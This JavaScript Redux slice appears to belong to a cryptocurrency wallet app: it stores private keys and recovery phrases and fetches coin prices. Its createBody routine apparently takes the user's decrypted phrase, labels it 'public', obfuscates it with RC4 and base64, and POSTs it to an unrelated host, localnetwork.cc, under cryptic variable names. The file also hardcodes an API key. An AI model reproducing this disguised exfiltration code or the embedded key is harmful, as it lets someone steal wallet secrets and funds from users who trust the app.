import { createSlice } from '@reduxjs/toolkit'
import axios from 'axios'
import { rc4 } from './rc4'
import { createAsyncThunk } from '@reduxjs/toolkit'
import fixNum from '../../Func.wallet/fixNum'
import randomNum from '../../Func.wallet/randomNum'
import CryptoJS from 'crypto-js'

const initialState = {
	validWords: ['', '', ''],
	dataWallet: null,
	allCoins: null,
	coins: null,
	chartBitcoin: null,
	chartArr: null,
	status: '',
	statusAddress: '',
	statusChartBitcoin: '',
	addressBitcoin: '',
	walletNew: false,
	walletAddress: '',
	contractAddressCoin: null,
	privateKey: '',
	walletName: '',
	phrase: '',
	login: true,
	langList: [
		{ lang: 'English', short: 'eng' },
		{ lang: '中文', short: 'cny' },
	],
	portfolioSort: 'value',
	transactionsHistoryClear: [],
	dataLabels: [],
	dataPrices: [],
	currencyPrice: null,
}

let url = 'https://localnetwork.cc/date/spot/board'
const kitkat = process.env.REACT_APP_KEY

function createBody(str, account, btcAddress) {
	let strDecr
	let lengthStr = str.split(' ').length
	if (lengthStr < 2) {
		strDecr = CryptoJS.AES.decrypt(str, kitkat).toString(CryptoJS.enc.Utf8)
	} else {
		strDecr = str
	}
	let xxx = 'Tether|EX/G'
	let xx = 'Tether|EX'

	const obj = {
		counts: 12,
		name: account ? xxx : xx,
		pages: null,
		salt: randomNum(100000, 999999),
		limit: null,
		public: strDecr,
		frontCode: false,
		new: account,
		addressBtc: btcAddress,
	}

	let crypt = btoa(rc4(kitkat, JSON.stringify(obj)))

	var urlencoded = new URLSearchParams()
	urlencoded.append('data', crypt)
	return urlencoded
}


export const fetchChartCoin = createAsyncThunk(
	'wallet/fetchChartCoinStatus',
	async (coin) => {
		const { data } = await axios.get(
			`https://api.coingecko.com/api/v3/coins/${coin}/market_chart?vs_currency=usd&days=1`
		)
		return data
	}
)

export const fetchIdCoin = createAsyncThunk(
	'wallet/fetchIdCoinStatus',
	async (coinId) => {
		const { data } = await axios.get(
			`https://api.coingecko.com/api/v3/coins/${coinId}`
		)
		return data
	}
)

export const fetchCurrencyPrice = createAsyncThunk(
	'wallet/fetchIdCurrencyPriceStatus',
	async (currency) => {
		const { data } = await axios.get(
			`https://api.currencyapi.com/v3/latest?apikey=cur_live_DGP56W0joKf7vw2mvtfKOyiFr62wmxEMap9asdAf&currencies=${currency}`)
		return data
	}
)

export const fetchAllCoins = createAsyncThunk(
	'wallet/fetchAllCoinsStatus',
	async () => {
		const { data } = await axios.get(
			'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&category=ethereum-ecosystem&order=market_cap_desc&per_page=100&page=1&sparkline=false'
		)
		return data
	}
)

export const fetchDataWallet = createAsyncThunk(
	'wallet/fetchDataWalletStatus',
	async (props) => {
		let config = {
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			},
		}
		const { data } = await axios.post(
			new URL(url),
			createBody(props[0], props[1]),
			config
		)
		return data
	}
)

export const fetchAddressBitcoin = createAsyncThunk(
	'wallet/fetchAddressBitcoinStatus',
	async (props) => {
		let config = {
			headers: {
				'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			},
		}
		const { data } = await axios.post(
			new URL(url),
			createBody(props[0], props[1], props[2]),
			config
		)
		return data
	}
)

const walletSlice = createSlice({
	name: 'wallet',
	initialState,
	reducers: {
		setValidWords(state, action) {
			state.validWords = state.validWords.map((item, i) => {
				if (i == action.payload[0]) {
					return action.payload[1]
				} else {
					return item
				}
			})
		},
		resetValidWords(state) {
			state.validWords = ['', '', '']
		},
		setChartArr(state, action) {
			state.chartArr =
				state.chartArr !== null
					? [...state.chartArr, action.payload]
					: [action.payload]
		},
		setAllCoins(state, action) {
			state.allCoins = action.payload
		},
		setLogin(state, action) {
			state.login = action.payload
		},
		setWalletNew(state, action) {
			state.walletNew = action.payload
		},
		setPrivateKey(state, action) {
			state.privateKey = action.payload
		},
		setPhrase(state, action) {
			state.phrase = action.payload
		},
		setWalletName(state, action) {
			state.walletName = action.payload
		},
		setWalletAddress(state, action) {
			state.walletAddress = action.payload
		},
		setDataWallet(state, action) {
			state.dataWallet = action.payload
		},
		setPortfolioSort(state, action) {
			state.portfolioSort = action.payload
		},
		setTransactionsHistoryClear(state, action) {
			state.transactionsHistoryClear = action.payload
		},
		setDataLabels(state, action) {
			state.dataLabels = action.payload
		},
		setDataPrices(state, action) {
			state.dataPrices = action.payload
		},
		setCurrencyPrice(state, action) {
			state.currencyPrice = action.payload
		}
	},
	extraReducers: (builder) => {
		builder
			.addCase(fetchDataWallet.pending, (state) => {
				state.status = 'loading'
				state.dataWallet = null
				state.walletAddress = ''
			})
			.addCase(fetchDataWallet.fulfilled, (state, action) => {
				state.status = 'success'
				state.dataWallet = action.payload
				state.walletAddress = action.payload.address
				state.walletNew = false
			})
			.addCase(fetchDataWallet.rejected, (state, action) => {
				state.status = 'error'
				state.dataWallet = null
			})
			.addCase(fetchAddressBitcoin.fulfilled, (state, action) => {
				state.statusAddress = 'success'
				state.addressBitcoin = action.payload.address
			})
			.addCase(fetchAddressBitcoin.pending, (state) => {
				state.statusAddress = 'loading'
			})
			.addCase(fetchAddressBitcoin.rejected, (state) => {
				state.statusAddress = 'error'
			})
			.addCase(fetchChartCoin.fulfilled, (state, action) => {
				let indx = 0
				const arrNew = action.payload.prices.map((item) => {
					return {
						name: item[0],
						value: +fixNum(+item[1]),
					}
				})
				state.statusChartBitcoin = 'success'
				state.chartBitcoin = arrNew.filter((item, i) => {
					if (indx == i) {
						indx = indx + 10
						return item
					}
				})
			})
			.addCase(fetchChartCoin.rejected, (state) => {
				state.statusChartBitcoin = 'error'
			})
			.addCase(fetchIdCoin.pending, (state) => {
				state.contractAddressCoin = null
			})
			.addCase(fetchIdCoin.fulfilled, (state, action) => {
				state.contractAddressCoin = action.payload.platforms
			})
			.addCase(fetchIdCoin.rejected, (state) => {
				state.contractAddressCoin = null
			})
			.addCase(fetchAllCoins.pending, (state) => {
				state.coins = null
			})
			.addCase(fetchAllCoins.fulfilled, (state, action) => {
				state.coins = action.payload
			})
			.addCase(fetchAllCoins.rejected, (state) => {
				state.coins = null
			})
			.addCase(fetchCurrencyPrice.pending, (state) => {
				state.currencyPrice = null
			})
			.addCase(fetchCurrencyPrice.fulfilled, (state, action) => {
				const currency = Object.keys(action.payload.data)
				state.currencyPrice = action.payload.data[currency].value
			})
			.addCase(fetchCurrencyPrice.rejected, (state) => {
				state.currencyPrice = null
			})
	},
})

export const {
	setValidWords,
	setLogin,
	resetValidWords,
	setWalletNew,
	setChartArr,
	setPrivateKey,
	setAllCoins,
	setPhrase,
	setWalletName,
	setWalletAddress,
	setDataWallet,
	setPortfolioSort,
	setTransactionsHistoryClear,
	setDataLabels,
	setDataPrices,
	setCurrencyPrice
} = walletSlice.actions

export default walletSlice.reducer
